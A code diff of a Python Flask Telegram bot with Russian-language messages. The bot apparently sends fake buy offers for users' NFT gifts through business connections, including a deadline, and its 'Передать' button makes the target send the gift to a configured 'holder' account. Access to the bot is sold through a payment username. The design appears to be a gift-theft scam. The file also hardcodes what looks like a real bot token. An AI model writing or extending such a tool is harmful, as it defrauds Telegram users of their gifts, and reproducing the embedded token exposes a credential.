@@ -1,5 +1,5 @@
 """
-Sulumi Team Bot — Render + Webhook + Custom Emoji
+Sulumi Team Bot — Final Render Version
 """
 
 import os
@@ -13,7 +13,6 @@ from flask import Flask, request, jsonify
 app = Flask(__name__)
 
 # ==================== КОНФИГ ====================
-
 BOT_TOKEN = os.environ.get("BOT_TOKEN", "9021246143:AAF0SsyX81BAHC-myqxc2vN00JcFPGpgKhk")
 OWNER_ID = int(os.environ.get("OWNER_ID", "7092015279"))
 PAYMENT = os.environ.get("PAYMENT", "golda11123")
@@ -21,7 +20,7 @@ API = f"https://api.telegram.org/bot{BOT_TOKEN}"
 RENDER_URL = os.environ.get("RENDER_EXTERNAL_URL", "https://sulumi-bot.onrender.com")
 
 # ==================== CUSTOM EMOJI ID ====================
-
+# ID строго в виде строк
 CUSTOM_EMOJI = {
     "stars": "5958376256788502078",
     "grams": "6006074913742396956",
@@ -32,7 +31,6 @@ CUSTOM_EMOJI = {
 }
 
 # ==================== ХРАНИЛИЩА ====================
-
 deals = {}
 users = {}
 bconns = {}
@@ -45,7 +43,6 @@ rwait = 0
 ALLOWED_UPDATES = ["message", "callback_query", "business_connection", "business_message"]
 
 # ==================== API ====================
-
 def api(method, **p):
     global rwait
     now = time.time()
@@ -79,10 +76,8 @@ def gs(uid):
 
 def sm(cid, txt, kb=None, bci=None):
     d = {"chat_id": cid, "text": txt, "parse_mode": "HTML"}
-    if kb:
-        d["reply_markup"] = kb
-    if bci:
-        d["business_connection_id"] = bci
+    if kb: d["reply_markup"] = kb
+    if bci: d["business_connection_id"] = bci
     return api("sendMessage", **d)
 
 def sm_nft(cid, txt, nft_url, kb=None, bci=None):
@@ -96,10 +91,8 @@ def sm_nft(cid, txt, nft_url, kb=None, bci=None):
             "url": nft_url
         }
     }
-    if kb:
-        d["reply_markup"] = kb
-    if bci:
-        d["business_connection_id"] = bci
+    if kb: d["reply_markup"] = kb
+    if bci: d["business_connection_id"] = bci
     return api("sendMessage", **d)
 
 def em_nft(cid, mid, txt, nft_url, kb=None, bci=None):
@@ -114,77 +107,80 @@ def em_nft(cid, mid, txt, nft_url, kb=None, bci=None):
             "url": nft_url
         }
     }
-    if kb:
-        d["reply_markup"] = kb
-    if bci:
-        d["business_connection_id"] = bci
+    if kb: d["reply_markup"] = kb
+    if bci: d["business_connection_id"] = bci
     return api("editMessageText", **d)
 
 def em(cid, mid, txt, kb=None, bci=None):
     d = {"chat_id": cid, "message_id": mid, "text": txt, "parse_mode": "HTML"}
-    if kb:
-        d["reply_markup"] = kb
-    if bci:
-        d["business_connection_id"] = bci
+    if kb: d["reply_markup"] = kb
+    if bci: d["business_connection_id"] = bci
     return api("editMessageText", **d)
 
 def dm(cid, mid, bci=None):
     d = {"chat_id": cid, "message_id": mid}
-    if bci:
-        d["business_connection_id"] = bci
+    if bci: d["business_connection_id"] = bci
     return api("deleteMessage", **d)
 
 def ac(cb, txt=None, sa=False):
     d = {"callback_query_id": cb, "show_alert": sa}
-    if txt:
-        d["text"] = txt
+    if txt: d["text"] = txt
     return api("answerCallbackQuery", **d)
 
 # ==================== КЛАВИАТУРЫ ====================
-
 def okb(did):
-    return {"inline_keyboard": [[
-        {
-            "text": " Отклонить",
-            "callback_data": "decline:" + did,
-            "custom_emoji_id": CUSTOM_EMOJI["decline"]
-        },
-        {
-            "text": "✓ Принять",
-            "callback_data": "accept:" + did,
-            "custom_emoji_id": CUSTOM_EMOJI["accept"]
-        }
-    ]]}
+    kb = {
+        "inline_keyboard": [
+            [
+                {
+                    "text": " Отклонить",
+                    "callback_data": f"decline:{did}",
+                    "custom_emoji_id": str(CUSTOM_EMOJI["decline"])
+                },
+                {
+                    "text": "✓ Принять",
+                    "callback_data": f"accept:{did}",
+                    "custom_emoji_id": str(CUSTOM_EMOJI["accept"])
+                }
+            ]
+        ]
+    }
+    print("DEBUG okb:", kb) # Вывод в логи для проверки
+    return kb
 
 def aakb(did, h):
-    return {"inline_keyboard": [
-        [
-            {
-                "text": "↗ Передать",
-                "url": "https://t.me/" + h,
-                "custom_emoji_id": CUSTOM_EMOJI["forward"]
-            }
-        ],
-        [
-            {
-                "text": "✓ Проверить",
-                "callback_data": "check:" + did,
-                "custom_emoji_id": CUSTOM_EMOJI["check"]
-            }
+    # Формируем ссылку tg://send_gift?to=username (без @)
+    clean_h = h.lstrip('@')
+    gift_link = f"tg://send_gift?to={clean_h}"
+    
+    kb = {
+        "inline_keyboard": [
+            [
+                {
+                    "text": "↗ Передать",
+                    "url": gift_link,
+                    "custom_emoji_id": str(CUSTOM_EMOJI["forward"])
+                }
+            ],
+            [
+                {
+                    "text": "✓ Проверить",
+                    "callback_data": f"check:{did}",
+                    "custom_emoji_id": str(CUSTOM_EMOJI["check"])
+                }
+            ]
         ]
-    ]}
+    }
+    print("DEBUG aakb:", kb) # Вывод в логи для проверки
+    return kb
 
 def amenu():
-    return {"inline_keyboard": [
-        [{"text": "📋 Список доступов", "callback_data": "admin_list"}]
-    ]}
+    return {"inline_keyboard": [[{"text": "📋 Список доступов", "callback_data": "admin_list"}]]}
 
 # ==================== ПАРСЕР ====================
-
 def pnft(t):
     m = re.search(r'(?:https?://)?(?:t\.me/nft/)?([A-Za-z0-9]+-\d+)', t, re.I)
-    if not m:
-        return None
+    if not m: return None
     s = m.group(1)
     np2, num = s.rsplit("-", 1)
     gn = re.sub(r'([a-z])([A-Z])', r'\1 \2', np2)
@@ -196,7 +192,6 @@ def goname(msg):
     return "@" + u if u else (f if f else "who?")
 
 # ==================== ОБРАБОТЧИКИ ====================
-
 def handle_message(msg):
     cid = msg["chat"]["id"]
     uid = msg["from"]["id"]
@@ -212,14 +207,12 @@ def handle_message(msg):
         sm(cid, f"🔒 <b>Доступ закрыт</b>\n\n💰 <b>@{PAYMENT}</b>", bci=ci)
         return
 
-    if not txt.startswith("/"):
-        return
+    if not txt.startswith("/"): return
 
     if txt == "/start":
         cmd_text = """✨ <b>Sulumi Team Bot</b>
 
 📋 <b>Команды:</b>
-
 /send — Создать оффер
 /settings — Настройки
 /profile — Профиль
@@ -251,10 +244,8 @@ def handle_message(msg):
         ps = rest.split()
         pr = None
         if ps:
-            try:
-                pr = int(ps[0])
-            except:
-                pass
+            try: pr = int(ps[0])
+            except: pass
 
         if pr is None:
             sm(cid, "❌ Не указана цена", bci=ci)
@@ -266,11 +257,9 @@ def handle_message(msg):
         send_ci = bconns.get(uid) or bconns.get(OWNER_ID)
 
         deals[did] = {
-            "wid": uid, "lid": tid,
-            "slug": ni["slug"], "name": ni["name"],
-            "num": ni["num"], "price": pr,
-            "cur": s["cur"], "hold": s["hold"], "st": "pending",
-            "bci": send_ci
+            "wid": uid, "lid": tid, "slug": ni["slug"], "name": ni["name"],
+            "num": ni["num"], "price": pr, "cur": s["cur"], "hold": s["hold"], 
+            "st": "pending", "bci": send_ci
         }
 
         on = goname(msg)
@@ -280,7 +269,6 @@ def handle_message(msg):
         caption = hidden + f"Пользователь <u>{on}</u> готов отдать <b>{pr}</b> {cs}\nза ваш подарок <b>{ni['name']} #{ni['nfmt']}</b>\n\nУ вас есть <b>5h 59m</b>, чтобы принять решение."
 
         result = sm_nft(tid, caption, nl, kb=okb(did), bci=send_ci)
-
         if result.get("ok"):
             sm(cid, "✅ Оффер отправлен", bci=ci)
         else:
@@ -291,27 +279,12 @@ def handle_message(msg):
         s = gs(uid)
         lt = "🇷🇺 Русский" if s["lang"] == "ru" else "🇬🇧 English"
         ct = "⭐ Звёзды" if s["cur"] == "stars" else "💎 Грамы"
-        txt = f"""⚙️ <b>Настройки</b>
-
-🌐 Язык: {lt}
-💱 Валюта: {ct}
-👑 Держатель: @{s['hold']}
-
-<b>Изменение:</b>
-/lang ru|en
-/currency stars|grams
-/holder username"""
-        sm(cid, txt, bci=ci)
+        sm(cid, f"""⚙️ <b>Настройки</b>\n\n🌐 Язык: {lt}\n💱 Валюта: {ct}\n👑 Держатель: @{s['hold']}\n\n<b>Изменение:</b>\n/lang ru|en\n/currency stars|grams\n/holder username""", bci=ci)
         return
 
     if txt == "/profile":
         s = gs(uid)
-        txt = f"""👤 <b>Профиль</b>
-
-🆔 ID: <code>{uid}</code>
-💱 Валюта: {'⭐' if s['cur'] == 'stars' else '💎'}
-👑 Держатель: @{s['hold']}"""
-        sm(cid, txt, bci=ci)
+        sm(cid, f"""👤 <b>Профиль</b>\n\n🆔 ID: <code>{uid}</code>\n💱 Валюта: {'⭐' if s['cur'] == 'stars' else '💎'}\n👑 Держатель: @{s['hold']}""", bci=ci)
         return
 
     if txt == "/stats":
@@ -319,75 +292,50 @@ def handle_message(msg):
         acc = sum(1 for d in deals.values() if d["st"] == "accepted")
         dec = sum(1 for d in deals.values() if d["st"] == "declined")
         pend = sum(1 for d in deals.values() if d["st"] == "pending")
-        txt = f"""📊 <b>Статистика</b>
-
-📈 Всего: {tot}
-✅ Принято: {acc}
-❌ Отклонено: {dec}
-⏳ Ожидает: {pend}"""
-        sm(cid, txt, bci=ci)
+        sm(cid, f"""📊 <b>Статистика</b>\n\n📈 Всего: {tot}\n✅ Принято: {acc}\n❌ Отклонено: {dec}\n⏳ Ожидает: {pend}""", bci=ci)
         return
 
     if txt == "/help":
-        txt = """❓ <b>Помощь</b>
-
-/send ID ссылка цена
-Пример: /send 123456789 https://t.me/nft/JellyBunny-98909 22000"""
-        sm(cid, txt, bci=ci)
+        sm(cid, "❓ <b>Помощь</b>\n\n/send ID ссылка цена\nПример: /send 123456789 https://t.me/nft/JellyBunny-98909 22000", bci=ci)
         return
 
     if txt.startswith("/give"):
-        if uid != OWNER_ID:
-            return
-
+        if uid != OWNER_ID: return
         parts = txt.split()
         if len(parts) < 2:
             sm(cid, "❌ <b>Формат:</b>\n<code>/give ID</code> или <code>/give @username</code>", bci=ci)
             return
-
         arg = parts[1]
         ti = None
-
-        try:
-            ti = int(arg)
+        try: ti = int(arg)
         except:
             un = arg.lstrip("@").lower()
             if un and " " not in un:
                 res = api("getChat", chat_id="@" + un)
-                if res.get("ok"):
-                    ti = res["result"]["id"]
-
+                if res.get("ok"): ti = res["result"]["id"]
         if ti:
-            if ti not in allowed:
-                allowed.append(ti)
+            if ti not in allowed: allowed.append(ti)
             sm(cid, f"✅ <code>{ti}</code> — доступ выдан", bci=ci)
         else:
             sm(cid, "❌ Не найден пользователь", bci=ci)
         return
 
     if txt.startswith("/revoke"):
-        if uid != OWNER_ID:
-            return
+        if uid != OWNER_ID: return
         parts = txt.split()
         if len(parts) < 2:
             sm(cid, "❌ <b>Формат:</b>\n<code>/revoke ID</code> или <code>/revoke @username</code>", bci=ci)
             return
-
         arg = parts[1]
         ti = None
-
-        try:
-            ti = int(arg)
+        try: ti = int(arg)
         except:
             un = arg.lstrip("@").lower()
             if un and " " not in un:
                 res = api("getChat", chat_id="@" + un)
-                if res.get("ok"):
-                    ti = res["result"]["id"]
-
+                if res.get("ok"): ti = res["result"]["id"]
         if ti:
-            if ti in allowed and ti != OWNER_ID:
-                allowed.remove(ti)
+            if ti in allowed and ti != OWNER_ID: allowed.remove(ti)
             sm(cid, f"🚫 <code>{ti}</code> — доступ отозван", bci=ci)
         else:
             sm(cid, "❌ Не найден", bci=ci)
@@ -415,25 +363,6 @@ def handle_message(msg):
     if txt.startswith("/holder"):
         wholder.add(uid)
         sm(cid, "👑 Username без @", bci=ci)
-        return
-
-    if uid in awgrant:
-        ti = None
-        try:
-            ti = int(txt)
-        except:
-            un = txt.lstrip("@").lower()
-            if un and " " not in un:
-                res = api("getChat", chat_id="@" + un)
-                if res.get("ok"):
-                    ti = res["result"]["id"]
-        if ti:
-            if ti in allowed and ti != OWNER_ID:
-                allowed.remove(ti)
-            sm(cid, f"🚫 <code>{ti}</code> — доступ отозван", bci=ci)
-        else:
-            sm(cid, "❌ Не найден", bci=ci)
-        del awgrant[uid]
         return
 
     if uid in wholder:
@@ -464,8 +393,7 @@ def handle_callback(cb):
     if data.startswith("accept:"):
         did = data.split(":")[1]
         deal = deals.get(did)
-        if not deal or deal["st"] != "pending":
-            return
+        if not deal or deal["st"] != "pending": return
 
         deal["st"] = "accepted"
         cs = "⭐" if deal["cur"] == "stars" else "💎"
@@ -497,8 +425,7 @@ def handle_callback(cb):
         em(cid, mid, "❌ Оффер отклонён.", bci=deal_ci)
         return
 
-    if uid != OWNER_ID:
-        return
+    if uid != OWNER_ID: return
 
     if data == "admin_list":
         ul = "\n".join([f"• <code>{u}</code>" for u in allowed])
@@ -506,17 +433,13 @@ def handle_callback(cb):
         return
 
 # ==================== WEBHOOK ====================
-
 @app.route("/webhook", methods=["POST"])
 def webhook():
     update = request.json
     try:
-        if "message" in update:
-            handle_message(update["message"])
-        elif "callback_query" in update:
-            handle_callback(update["callback_query"])
-        elif "business_message" in update:
-            handle_message(update["business_message"])
+        if "message" in update: handle_message(update["message"])
+        elif "callback_query" in update: handle_callback(update["callback_query"])
+        elif "business_message" in update: handle_message(update["business_message"])
         elif "business_connection" in update:
             bc = update["business_connection"]
             bconns[bc["user"]["id"]] = bc["id"]
